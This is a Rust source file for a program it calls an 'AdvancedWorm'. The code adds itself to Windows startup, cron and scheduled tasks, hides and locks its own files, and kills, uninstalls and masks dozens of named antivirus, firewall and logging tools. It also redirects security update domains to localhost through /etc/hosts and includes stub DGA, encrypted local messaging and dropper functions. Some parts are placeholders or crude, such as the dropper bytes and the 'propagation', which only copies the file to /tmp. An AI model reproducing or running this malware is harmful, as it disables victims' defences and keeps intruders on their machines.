use std::env;
use std::fs;
use std::io::{self, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;
use std::process::Command;

use base64::{Engine};
use base64::engine::general_purpose; 
use openssl::error::ErrorStack;
use openssl::symm::{Crypter, Cipher, Mode};
use openssl::rsa::{Rsa}; 
use openssl::rand::rand_bytes;

const PORT: u16 = 9999;
const BUFFER_SIZE: usize = 2048;
const AES_KEY_SIZE: usize = 32;
const AES_IV_SIZE: usize = 16;
const RSA_KEY_SIZE: u32 = 2048;

#[derive(Debug)]
enum WormError {
    OpensslError(ErrorStack),
    IoError(io::Error),
    Base64Error(base64::DecodeError),
}

impl From<ErrorStack> for WormError {
    fn from(err: ErrorStack) -> WormError {
        WormError::OpensslError(err)
    }
}

impl From<io::Error> for WormError {
    fn from(err: io::Error) -> WormError {
        WormError::IoError(err)
    }
}

impl From<base64::DecodeError> for WormError {
    fn from(err: base64::DecodeError) -> WormError {
        WormError::Base64Error(err)
    }
}

struct WormConfig {
    rsa_key_pair: Rsa<openssl::pkey::Private>,
    aes_key: Vec<u8>,
    iv: Vec<u8>,
}

impl WormConfig {
    fn new() -> Result<Self, WormError> {
        let rsa_key_pair = Rsa::generate(RSA_KEY_SIZE)?;
        let mut aes_key = vec![0u8; AES_KEY_SIZE];
        let mut iv = vec![0u8; AES_IV_SIZE];
        rand_bytes(&mut aes_key)?;
        rand_bytes(&mut iv)?;

        Ok(WormConfig {
            rsa_key_pair,
            aes_key,
            iv,
        })
    }
}

struct AdvancedWorm {
    config: WormConfig,
}

impl AdvancedWorm {
    fn new(config: WormConfig) -> Self {
        AdvancedWorm { config }
    }

    fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>, WormError> {
        let cipher = Cipher::aes_256_cbc();
        let mut encrypter = Crypter::new(cipher, Mode::Encrypt, &self.config.aes_key, Some(&self.config.iv))?;
        let mut ciphertext = vec![0u8; plaintext.len() + cipher.block_size()];
        let mut count = encrypter.update(plaintext, &mut ciphertext)?;
        count += encrypter.finalize(&mut ciphertext[count..])?;
        ciphertext.truncate(count);
        Ok([self.config.iv.clone(), ciphertext].concat()) // Append IV to ciphertext
    }

    fn decrypt(&self, ciphertext: &[u8]) -> Result<Vec<u8>, WormError> {
        let (iv, ciphertext) = ciphertext.split_at(AES_IV_SIZE);
        let cipher = Cipher::aes_256_cbc();
        let mut decrypter = Crypter::new(cipher, Mode::Decrypt, &self.config.aes_key, Some(iv))?;
        let mut plaintext = vec![0u8; ciphertext.len() + cipher.block_size()];
        let mut count = decrypter.update(ciphertext, &mut plaintext)?;
        count += decrypter.finalize(&mut plaintext[count..])?;
        plaintext.truncate(count);
        Ok(plaintext)
    }

    fn communicate(&self, message: &str) -> Result<(), WormError> {
        let mut stream = TcpStream::connect(format!("localhost:{}", PORT))?;
        let encrypted_message = self.encrypt(message.as_bytes())?;
        let encoded_message = base64::encode(&encrypted_message);
        stream.write_all(encoded_message.as_bytes())?;
        Ok(())
    }

    fn listen(&self) -> Result<(), WormError> {
        let listener = TcpListener::bind(format!("localhost:{}", PORT))?;
        for stream in listener.incoming() {
            let mut stream = stream?;
            let mut buffer = vec![0u8; BUFFER_SIZE];
            let size = stream.read(&mut buffer)?;
            let encoded_message = &buffer[..size];
            let encrypted_message = base64::decode(encoded_message)?;
            let decrypted_message = self.decrypt(&encrypted_message)?;
            println!("Received message: {}", String::from_utf8_lossy(&decrypted_message));
        }
        Ok(())
    }

    fn add_to_startup(&self) -> Result<(), WormError> {
        // Windows logic
        let current_dir = env::current_dir()?;
        let worm_path = current_dir.join("worm.exe"); // Assuming the executable is named "worm.exe"
        let startup_dir = Path::new("C:\\Users\\<USERNAME>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
        let startup_path = startup_dir.join("worm.exe");

        if !startup_path.exists() {
            fs::copy(&worm_path, &startup_path)?; // Copy to startup directory
        }

        Ok(())
    }

    fn create_cron_job(&self) -> Result<(), WormError> {
        // Linux logic
        let cron_dir = Path::new("/etc/cron.d");
        let cron_path = cron_dir.join("worm");

        if !cron_path.exists() {
            let mut file = fs::File::create(cron_path)?;
            file.write_all(b"* * * * * root /path/to/worm\n")?;
        }

        // Windows logic
        let task_name = "WormTask";
        let task_command = format!("schtasks /create /tn {} /tr \"{}\\worm.exe\" /sc minute /mo 1", task_name, env::current_dir()?.display());
        Command::new("cmd").args(&["/C", &task_command]).status()?;

        Ok(())
    }

    fn hide_files(&self) -> Result<(), WormError> {
        // Linux logic
        let worm_path = env::current_dir()?.join("worm");
        Command::new("chattr").arg("+i").arg(worm_path.to_str().unwrap()).status()?;

        // Windows logic
        let worm_path_windows = env::current_dir()?.join("worm.exe");
        Command::new("attrib").arg("+h").arg(worm_path_windows.to_str().unwrap()).status()?;

        Ok(())
    }

    fn self_propagate(&self) -> Result<(), WormError> {
        let current_dir = env::current_dir()?;
        let worm_path = current_dir.join("worm");
        let tmp_dir = Path::new("/tmp");
        let tmp_path = tmp_dir.join("worm");

        if !tmp_path.exists() {
            fs::copy(&worm_path, &tmp_path)?;
            Command::new("chmod").arg("755").arg(&tmp_path).status()?;
        }

        Ok(())
    }

    /// **Disables and uninstalls security tools**
    fn disable_security_tools(&self) -> Result<(), WormError> {
        let tools = vec!["clamav", "maldet", "wireshark", "rkhunter", "chkrootkit", "suricata", "malwarebytes", "avast", "crowdstrike", "falcon", 
            "fail2ban", "ufw", "iptables", "firewalld", "selinux", "apparmor", "auditd", "sysdig", "osquery", "sysmon", "syslog-ng", 
            "logrotate", "logwatch", "auditbeat", "filebeat", "metricbeat", "packetbeat", "heartbeat", "winlogbeat", "journalbeat", 
            "elasticsearch", "kibana", "logstash", "beats", "ossec", "samhain", "aide", "tripwire", "lynis", "tiger", "nessus", "openvas", 
"clamav", "maldet", "wireshark","rkhunter", "chkrootkit", "suricata" , "malwarebytes", "avast" , "crowdstrike", "falcon", ];
        for tool in tools.iter() {
            // Kill any running processes related to the security tool
            Command::new("pkill").arg(tool).status().ok();
            // Uninstall the security tool
            Command::new("apt-get")
                .arg("remove")
                .arg("-y")
                .arg(tool)
                .status()
                .ok();
            // Mask the service to prevent it from being reinstalled or restarted
            Command::new("systemctl").arg("mask").arg(tool).status().ok();
            println!("Disabled and removed: {}", tool);
        }
        Ok(())
    }

    fn block_security_updates(&self) -> Result<(), WormError> {
        let mut file = fs::OpenOptions::new()
            .append(true)
            .open("/etc/hosts")?;

        // Block popular security update domains
        let domains = vec![
            "clamav.net",
            "rkhunter.sourceforge.net",
            "maldet.net",
            "debian.org/security",
            "ubuntu.com/security",
            "redhat.com/security",
            "centos.org/security",
            "opensuse.org/security",
            "fedora.redhat.com/security",
            "security.debian.org",
            "security.ubuntu.com",
            "updates.redhat.com",
            "updates.centos.org",
            "updates.opensuse.org",
            "updates.fedoraproject.org",
            "avast.com",
            "malwarebytes.com",
            "crowdstrike.com",
            "falcon.crowdstrike.com"
        ];

        for domain in domains {
            writeln!(file, "127.0.0.1 {}", domain)?;
        }

        Ok(())
    }

    fn detect_security_tools(&self) -> Result<(), WormError> {
        let tools = vec!["clamd", "freshclam", "maldet", "rkhunter", "suricata", "malwarebytes", "avast", "crowdstrike", "falcon", 
            "fail2ban", "ufw", "iptables", "firewalld", "selinux", "apparmor", "auditd", "sysdig", "osquery", "sysmon", "syslog-ng", 
            "logrotate", "logwatch", "auditbeat", "filebeat", "metricbeat", "packetbeat", "heartbeat", "winlogbeat", "journalbeat", 
            "elasticsearch", "kibana", "logstash", "beats", "ossec", "samhain", "aide", "tripwire", "lynis", "tiger", "nessus", "openvas", 
"clamav", "maldet", "wireshark","rkhunter", "chkrootkit", "suricata" , "malwarebytes", "avast" , "crowdstrike", "falcon"];
        for tool in tools {
            let output = Command::new("pgrep").arg(tool).output()?;
            if output.status.success() {
                println!("Security tool detected: {}", tool);
                self.disable_security_tools()?;
            }
        }
        Ok(())
    }

    fn generate_dga_domain(&self) -> Result<String, WormError> {
        let domain = format!("example{}.com", rand::random::<u32>());
        Ok(domain)
    }
}

impl AdvancedWorm {
    fn run_dropper(&self) -> Result<(), WormError> {
        Command::new("dropper.exe") // Call the dropper executable
            .status()?;
        Ok(())
    }

    fn create_dropper(&self) -> Result<(), WormError> {
        // Raw assembly code as a byte array
        let asm_code: &[u8] = &[
            0x60, // Example byte values, replace with actual assembly bytes
            0x70,
            0x80,
            0x90,
            0xA0,
            0xB0,
            0xC0,
            0xD0,
        ];

        // Write the assembly code to a file
        let dropper_path = "dropper.asm";
        fs::write(dropper_path, asm_code)?;

        // Compile the assembly code to create the dropper executable
        // This assumes you have an assembler like NASM installed
        Command::new("nasm")
            .args(&["-f", "win64", dropper_path, "-o", "dropper.exe"])
            .status()?;

        // Run the dropper executable
        self.run_dropper()?;
        Ok(())
    }
}

fn main() -> Result<(), WormError> {
    let config = WormConfig::new()?;
    let worm = AdvancedWorm::new(config);

    worm.add_to_startup()?;
    worm.create_cron_job()?;
    worm.hide_files()?;
    worm.self_propagate()?;

    worm.detect_security_tools()?;
    worm.block_security_updates()?;

    let domain = worm.generate_dga_domain()?;
    println!("Generated DGA domain: {}", domain);

    worm.communicate("Test message")?;
    worm.listen()?;
    
    worm.create_dropper()?; // Call the dropper creation function

    Ok(())
}